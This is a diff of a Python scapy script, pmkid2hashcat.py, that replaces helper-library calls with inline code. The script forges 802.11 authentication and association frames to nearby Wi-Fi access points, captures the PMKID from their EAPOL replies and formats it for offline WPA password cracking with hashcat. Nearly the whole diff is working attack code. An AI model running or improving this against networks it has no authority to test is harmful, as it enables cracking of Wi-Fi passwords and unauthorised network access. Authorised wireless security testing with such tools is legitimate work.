@@ -1,20 +1,12 @@
 #!/usr/bin/python3
-"""
-python3 ./pmkid2hashcat.py -i wlan1mon
-hashcat -m 22000 hashes.file <wordlist>
-
-Needs://
-    - git clone https://github.com/stryngs/packetEssentials
-    - git clone https://github.com/stryngs/easy-thread
-    - git clone https://github.com/stryngs/quickset
-"""
 
 import argparse
 import binascii
-import packetEssentials as PE
-import quickset as qs
+# import packetEssentials as PE
+# import quickset as qs
 import sys
-from easyThread import Backgrounder
+# from easyThread import Backgrounder
+import threading
 from scapy.all import *
 
 class Shared(object):
@@ -63,16 +55,47 @@ class Shared(object):
         Based on experimentation with hcxdumptool
         """
         if self.args.random is True:
-            qs.sh.macTx = RandMAC()._fix()
+            # qs.sh.macTx = RandMAC()._fix()
+            macTx = RandMAC()._fix()
         else:
-            qs.sh.macTx = 'a0:12:34:56:78:90'
-        qs.sh.macRx = tgtMac
-        qs.sh.essid = tgtEssid
-        auth1 = qs.supplicants.authenticate()
+            # qs.sh.macTx = 'a0:12:34:56:78:90'
+            macTx = 'a0:12:34:56:78:90'
+        # qs.sh.macRx = tgtMac
+        macRx = tgtMac
+        # qs.sh.essid = tgtEssid
+        essid = tgtEssid
+        # auth1 = qs.supplicants.authenticate()
+        auth1 = RadioTap()\
+                /Dot11(type = 0,
+                       subtype = 11,
+                       addr1 = macRx,
+                       addr2 = macTx,
+                       addr3 = macRx)\
+                /Dot11Auth(algo = 0,
+                           seqnum = 1)
         auth1[Dot11].SC = 16
-        auth2 = qs.supplicants.authenticate()
+        # auth2 = qs.supplicants.authenticate()
+        auth2 = RadioTap()\
+                /Dot11(type = 0,
+                       subtype = 11,
+                       addr1 = macRx,
+                       addr2 = macTx,
+                       addr3 = macRx)\
+                /Dot11Auth(algo = 0,
+                           seqnum = 1)
         auth2[Dot11].SC = 32
-        ourAssc = qs.supplicants.associate()\
+        # ourAssc = qs.supplicants.associate()\
+        #           /Dot11EltRSN(binascii.unhexlify('30140100000FAC040100000FAC040100000FAC020C00'))
+        ourAssc = RadioTap()\
+                  /Dot11(type = 0,
+                         subtype = 0,
+                         addr1 = macRx,
+                         addr2 = macTx,
+                         addr3 = macRx)\
+                  /Dot11AssoReq()\
+                  /Dot11Elt(ID = 'SSID', info = essid)\
+                  /Dot11EltRates(rates = [2, 4, 11, 22, 12, 18, 24, 36])\
+                  /Dot11EltRates(ID = 50, rates = [48, 72, 96, 108])\
                   /Dot11EltRSN(binascii.unhexlify('30140100000FAC040100000FAC040100000FAC020C00'))
         ourAssc[Dot11].SC = 48
         sendp([auth1, auth2, ourAssc], iface = iFace, inter = 1, verbose = False)
@@ -81,10 +104,12 @@ class Shared(object):
 def pmkRip(packet):
     """Attempt to rip the PMKID"""
     try:
-        pmkid = PE.pt.byteRip(packet[Raw].load,
-                              order = 'last',
-                              qty = 16,
-                              compress = True)
+        # pmkid = PE.pt.byteRip(packet[Raw].load,
+        #                       order = 'last',
+        #                       qty = 16,
+        #                       compress = True)
+        stream = hexstr(packet[Raw].load, onlyhex = 1).split(' ')
+        pmkid = ' '.join(stream[len(stream) - 16:]).replace(' ', '')
         if pmkid[-1] != 0:
             return pmkid
         else:
@@ -141,9 +166,7 @@ def packetHandler(sh):
                             sh.capSet.add(packet[Dot11].addr2)
 
                         except Exception as e:
-                            print('\n\n')
-                            print(e)
-                            print ('Error on line {}'.format(sys.exc_info()[-1].tb_lineno))
+                            print(f'\n\n{e}\nError on line {sys.exc_info()[-1].tb_lineno}')
     return snarf
 
 
@@ -169,9 +192,12 @@ def main(sh, args):
     if args.i is not None:
 
         ## Background Beacon sniffing
-        Backgrounder.theThread = sh.beaconBackgrounder
-        bg = Backgrounder()
-        bg.easyLaunch()
+        # Backgrounder.theThread = sh.beaconBackgrounder
+        # bg = Backgrounder()
+        # bg.easyLaunch()
+        theThread = threading.Thread(target = sh.beaconBackgrounder)
+        theThread.daemon = True
+        theThread.start()
 
         ## EAPOL sniffing
         pkts = sniff(iface = args.i, prn = pHandler, lfilter = LFILTER, store = 0)
